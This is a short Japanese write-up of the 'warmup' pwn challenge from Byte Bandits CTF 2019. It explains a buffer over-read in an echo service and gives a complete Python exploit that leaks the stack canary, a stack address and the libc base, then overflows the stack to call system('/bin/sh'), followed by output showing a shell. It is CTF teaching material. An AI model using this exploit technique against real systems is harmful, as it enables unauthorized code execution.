# [pwn ???pts] warmup - Byte Bandits CTF 2019
32ビットでPIE以外有効です。
```
$ checksec -f pwnable
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      Yes	0		0	pwnable
```
breakと入力するまで何回でもECHOしてくれるサービスです。
getcしているのでNULL終端にならず、バッファオーバーリードがあります。
したがって、canaryやlibc baseをリークした後にstack overflowでシェルを取りましょう。

```python
from ptrlib import *

#sock = Socket("13.233.66.116", 7000)
#libc = ELF("./libc6_2.23-0ubuntu10_i386.so")
#diff = 247
sock = Process("./pwnable")
libc = ELF("/lib/i386-linux-gnu/libc-2.27.so")
diff = 241

# leak canary
payload = b'A' * 0x21
sock.sendline(payload)
canary = sock.recvline()[0x20:0x24]
canary = b'\x00' + canary[1:]
dump(b"canary = " + canary)

# leak stack address
payload = b'A' * 0x2c
sock.sendline(payload)
addr_stack = u32(sock.recvline()[0x2c:0x30])
dump("saved stack address = " + hex(addr_stack))

# leak libc base
payload = b'A' * 0x40
sock.sendline(payload)
addr_ret = u32(sock.recvline()[0x40:0x44])
libc_base = addr_ret - libc.symbol("__libc_start_main") - diff
addr_system = libc_base + libc.symbol("system")
addr_binsh = libc_base + next(libc.find("/bin/sh"))
dump("libc base = " + hex(libc_base))

# get the shell!
payload = b'A' * 0x20
payload += canary
payload += b'A' * 8
payload += p32(addr_stack)
payload += b'A' * 0x20
payload += p32(addr_system)
payload += p32(0x41414141)
payload += p32(addr_binsh)
sock.sendline(payload)
sock.sendline("break")

sock.interactive()
```

```
$ python solve.py 
[+] Process: Successfully created new process (PID=5188)
[ptrlib] b'canary = \x00J>\x87'
[ptrlib] saved stack address = 0xffda80d0
[ptrlib] libc base = 0xf7db6000
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[ptrlib]$ whoami
ptr
```

# 感想
よくある問題だと思います。